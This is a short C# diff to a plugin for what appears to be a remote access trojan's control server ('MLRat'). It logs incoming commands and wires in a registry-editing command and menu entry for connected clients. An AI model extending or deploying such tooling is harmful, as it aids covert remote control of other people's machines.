@@ -39,7 +39,10 @@ namespace MLManagementServer
         {
             NetworkCommand command = (NetworkCommand)data[0];
 
+            Console.WriteLine("Network Command: {0}", command.ToString());
+
             if (command == NetworkCommand.Pong) PingHandler.EndPing(client);
+            if (command == NetworkCommand.RegistryEdit) RegistryEditorHandler.Handle(client, data);
         }
 
         public void OnPluginLoad(IServerUIHandler UIHost)
@@ -52,7 +55,8 @@ namespace MLManagementServer
 
             network.SubMenus = new MLRatContextEntry[]
             {
-                new MLRatContextEntry(){Text = "Ping",OnClick = PingHandler.ContextCallback}
+                new MLRatContextEntry(){Text = "Ping",OnClick = PingHandler.ContextCallback},
+                new MLRatContextEntry() {Text = "Registry Edit", OnClick = RegistryEditorHandler.ContextCallback }
             };
 
             UIHost.AddContext(network);
